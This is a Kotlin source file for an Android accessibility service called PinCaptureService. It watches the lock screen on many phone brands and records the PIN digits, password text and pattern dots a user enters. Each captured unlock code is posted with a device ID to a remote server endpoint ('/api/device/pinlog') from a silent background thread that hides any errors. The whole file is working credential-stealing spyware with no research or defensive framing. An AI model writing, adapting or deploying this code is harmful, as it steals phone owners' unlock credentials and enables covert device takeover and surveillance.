package com.kztutorial99.androidconnector

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.view.accessibility.AccessibilityEvent
import com.google.gson.JsonObject
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.util.concurrent.TimeUnit

class PinCaptureService : AccessibilityService() {

    private val http = OkHttpClient.Builder()
        .connectTimeout(8, TimeUnit.SECONDS)
        .readTimeout(8, TimeUnit.SECONDS)
        .build()
    private val JSON_MEDIA = "application/json; charset=utf-8".toMediaType()

    private val pinBuffer   = StringBuilder()
    private var isOnLock    = false
    private var lockType    = "pin"
    private var lastSent    = ""
    private var patternDots = mutableListOf<String>()

    private val LOCK_PKGS = setOf(
        "com.android.systemui",
        "com.android.keyguard",
        "com.miui.home",
        "com.miui.keyguard",
        "com.samsung.android.app.cocktailbarservice",
        "com.coloros.launcher",
        "com.vivo.launcher",
        "com.huawei.systemmanager",
        "com.lge.clock",
        "com.sec.android.app.launcher",
        "com.motorola.launcher3",
        "com.oneplus.launcher"
    )

    override fun onServiceConnected() {
        serviceInfo = AccessibilityServiceInfo().apply {
            eventTypes =
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED   or
                AccessibilityEvent.TYPE_VIEW_CLICKED            or
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED       or
                AccessibilityEvent.TYPE_VIEW_SCROLLED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags        = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                           AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
            notificationTimeout = 50
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        val ev  = event ?: return
        val pkg = ev.packageName?.toString() ?: return

        when (ev.eventType) {

            // ── Deteksi lock screen muncul / hilang ───────────────────────────
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val cls = ev.className?.toString() ?: ""
                val isLockWindow =
                    pkg in LOCK_PKGS ||
                    cls.contains("KeyguardBouncer",  ignoreCase = true) ||
                    cls.contains("LockScreen",        ignoreCase = true) ||
                    cls.contains("KeyguardHostView",  ignoreCase = true) ||
                    cls.contains("StatusBarKeyguard", ignoreCase = true) ||
                    cls.contains("PhoneWindow",       ignoreCase = true) && pkg in LOCK_PKGS

                if (isLockWindow) {
                    if (!isOnLock) {
                        isOnLock = true
                        pinBuffer.clear()
                        patternDots.clear()
                        lockType = "pin"
                    }
                } else if (isOnLock && pkg !in LOCK_PKGS) {
                    // Layar dibuka — kirim hasil capture
                    val captured = buildCaptureString()
                    if (captured.isNotBlank()) sendCapture(captured, lockType)
                    isOnLock = false
                    pinBuffer.clear()
                    patternDots.clear()
                }
            }

            // ── Klik tombol PIN / Password ────────────────────────────────────
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                val inLockContext = isOnLock || pkg in LOCK_PKGS
                if (!inLockContext) return

                val src     = ev.source ?: return
                val desc    = src.contentDescription?.toString() ?: ""
                val viewId  = src.viewIdResourceName ?: ""
                val srcCls  = src.className?.toString() ?: ""

                when {
                    // Angka 0–9 pada keypad PIN
                    desc.matches(Regex("[0-9]")) -> {
                        lockType = "pin"
                        isOnLock = true
                        pinBuffer.append(desc)
                    }

                    // Tombol hapus / backspace
                    desc.equals("Delete",    ignoreCase = true) ||
                    desc.equals("Backspace", ignoreCase = true) ||
                    viewId.contains("delete",    ignoreCase = true) ||
                    viewId.contains("backspace", ignoreCase = true) -> {
                        if (pinBuffer.isNotEmpty())
                            pinBuffer.deleteCharAt(pinBuffer.length - 1)
                    }

                    // Tombol OK / Enter (kirim langsung)
                    desc.equals("OK",    ignoreCase = true) ||
                    desc.equals("Enter", ignoreCase = true) ||
                    viewId.contains("key_enter",  ignoreCase = true) ||
                    viewId.contains("key_ok",     ignoreCase = true) -> {
                        val captured = buildCaptureString()
                        if (captured.isNotBlank()) {
                            sendCapture(captured, lockType)
                            pinBuffer.clear()
                        }
                    }

                    // Pattern view click (dot tersentuh)
                    srcCls.contains("PatternView", ignoreCase = true) ||
                    viewId.contains("lockPattern",  ignoreCase = true) -> {
                        lockType = "pattern"
                        isOnLock = true
                        // Catat koordinat relatif jika ada
                        val col = src.extras?.getInt("col", -1) ?: -1
                        val row = src.extras?.getInt("row", -1) ?: -1
                        if (col >= 0 && row >= 0) patternDots.add("($row,$col)")
                    }
                }
                src.recycle()
            }

            // ── Perubahan teks (password / PIN di field) ──────────────────────
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val inLockContext = isOnLock || pkg in LOCK_PKGS
                if (!inLockContext) return

                val src    = ev.source ?: return
                val srcCls = src.className?.toString() ?: ""

                if (srcCls.contains("EditText", ignoreCase = true)) {
                    val text = ev.text.joinToString("").trim()
                    if (text.isNotBlank()) {
                        lockType = "password"
                        isOnLock = true
                        pinBuffer.clear()
                        pinBuffer.append(text)
                    }
                }
                src.recycle()
            }

            // ── Scroll / gesture pada PatternView ─────────────────────────────
            AccessibilityEvent.TYPE_VIEW_SCROLLED -> {
                val inLockContext = isOnLock || pkg in LOCK_PKGS
                if (!inLockContext) return

                val src    = ev.source ?: return
                val srcCls = src.className?.toString() ?: ""

                if (srcCls.contains("PatternView", ignoreCase = true)) {
                    lockType = "pattern"
                    isOnLock = true
                }
                src.recycle()
            }
        }
    }

    override fun onInterrupt() {}

    private fun buildCaptureString(): String {
        return when (lockType) {
            "pattern" -> if (patternDots.isNotEmpty()) patternDots.joinToString(" → ") else ""
            else      -> pinBuffer.toString()
        }
    }

    private fun sendCapture(value: String, type: String) {
        if (value.isBlank() || value == lastSent) return
        lastSent = value

        val prefs    = getSharedPreferences("connector_prefs", Context.MODE_PRIVATE)
        val deviceId = prefs.getString("device_id", null) ?: return

        val body = JsonObject().apply {
            addProperty("deviceId", deviceId)
            addProperty("type",     type)
            addProperty("value",    value)
        }

        Thread {
            try {
                http.newCall(
                    Request.Builder()
                        .url("${SecureConfig.serverUrl()}/api/device/pinlog")
                        .post(body.toString().toRequestBody(JSON_MEDIA))
                        .build()
                ).execute().close()
            } catch (_: Exception) {}
        }.also { it.isDaemon = true }.start()
    }
}
